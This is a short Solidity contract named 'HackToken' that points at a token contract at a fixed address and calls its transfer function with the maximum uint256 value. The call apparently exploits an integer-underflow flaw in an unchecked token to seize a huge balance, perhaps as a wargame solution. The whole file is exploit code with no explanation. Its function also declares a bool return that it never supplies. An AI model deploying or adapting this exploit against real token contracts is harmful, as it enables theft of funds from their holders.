// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './Token.sol';
contract HackToken {
    
  Token public token = Token(0xa9D55A5f09346508E5C66c5D77AE93D0396a3252);

  
  function transfer(address _to) public returns (bool) {
    uint256 MAX_INT = uint256(-1);
    token.transfer(_to, MAX_INT);
  }

}